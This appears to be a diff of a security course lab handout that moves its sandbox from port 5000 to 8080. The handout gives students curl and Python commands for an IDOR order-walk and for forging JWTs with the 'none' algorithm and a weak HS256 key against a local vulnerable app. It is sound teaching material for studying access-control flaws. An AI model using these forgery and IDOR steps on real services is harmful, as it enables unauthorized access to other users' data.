@@ -4,7 +4,7 @@
 > **Aligned:** OWASP 2025 **A01 Broken Access Control**, **A07 Authentication Failures** · **CWE-639** (IDOR), **CWE-347** (improper signature verification), **CWE-321** (weak hardcoded key)
 > **Signature games:** 🗺️ **IDOR Treasure Hunt** — walk the `oid` numbers to loot orders that aren't yours · 🔏 **JWT Forgery** — mint a token you were never given.
 
-> ⚠️ **Ethics note:** Forging tokens and accessing other users' objects is only legal in this sandbox (`vulnerable_app.py`) and your own Juice Shop. Doing it to a real service is unauthorized access. Keep all activity inside `http://localhost:5000`.
+> ⚠️ **Ethics note:** Forging tokens and accessing other users' objects is only legal in this sandbox (`vulnerable_app.py`) and your own Juice Shop. Doing it to a real service is unauthorized access. Keep all activity inside `http://localhost:8080`.
 
 ## Part 1 — Student Information
 
@@ -33,9 +33,8 @@ Answer in 2–4 sentences each.
 ```bash
 cd labs/week06-authn-authz
 docker compose up            # python:3.12-slim + flask + pyjwt, runs vulnerable_app.py
-# vulnerable app -> http://localhost:5000   (service name: authz-lab, port 5000)
+# vulnerable app -> http://localhost:8080   (service name: authz-lab, port 8080)
 ```
-> 💡 **macOS:** if this fails with `port 5000 … address already in use`, turn off *System Settings → General → AirDrop & Handoff → AirPlay Receiver*, or run inside the course VM (no conflict).
 Optional secondary target / proxy:
 ```bash
 docker run --rm -p 3000:3000 bkimminich/juice-shop       # -> http://localhost:3000
@@ -48,7 +47,7 @@ docker run --rm -p 3000:3000 bkimminich/juice-shop       # -> http://localhost:3
 
 **Task 0 — Onboarding (5 min).** Get alice's token (from `attack.md`):
 ```bash
-TOKEN=$(curl -s -X POST http://localhost:5000/login \
+TOKEN=$(curl -s -X POST http://localhost:8080/login \
   -H 'Content-Type: application/json' \
   -d '{"user":"alice","pw":"alicepw"}' | python3 -c 'import sys,json;print(json.load(sys.stdin)["token"])')
 echo "$TOKEN"
@@ -59,8 +58,8 @@ Confirm `/api/orders/1` returns alice's Laptop order. *Deliverable: screenshot o
 - *Goal:* read **bob's** order with **alice's** token.
 - *Steps:*
   ```bash
-  curl -s http://localhost:5000/api/orders/1 -H "Authorization: Bearer $TOKEN"   # yours
-  curl -s http://localhost:5000/api/orders/2 -H "Authorization: Bearer $TOKEN"   # bob's — leaks!
+  curl -s http://localhost:8080/api/orders/1 -H "Authorization: Bearer $TOKEN"   # yours
+  curl -s http://localhost:8080/api/orders/2 -H "Authorization: Bearer $TOKEN"   # bob's — leaks!
   ```
 - *Deliverable:* both responses + screenshot of bob's `Phone` order + why the missing ownership check (CWE-639) is the root cause.
 
@@ -73,7 +72,7 @@ Confirm `/api/orders/1` returns alice's Laptop order. *Deliverable: screenshot o
   print(jwt.encode({"sub": "bob"}, key="", algorithm="none"))
   PY
   )
-  curl -s http://localhost:5000/api/orders/2 -H "Authorization: Bearer $FORGED"
+  curl -s http://localhost:8080/api/orders/2 -H "Authorization: Bearer $FORGED"
   ```
 - *Deliverable:* the forged token + screenshot of the accepted response + explanation of the `none` flaw (CWE-347).
 
@@ -86,7 +85,7 @@ Confirm `/api/orders/1` returns alice's Laptop order. *Deliverable: screenshot o
   print(jwt.encode({"sub": "bob"}, "secret", algorithm="HS256"))
   PY
   )
-  curl -s http://localhost:5000/api/orders/2 -H "Authorization: Bearer $FORGED2"
+  curl -s http://localhost:8080/api/orders/2 -H "Authorization: Bearer $FORGED2"
   ```
 - *Deliverable:* token + screenshot + 2–3 sentences on why secret strength + key management matter.
 
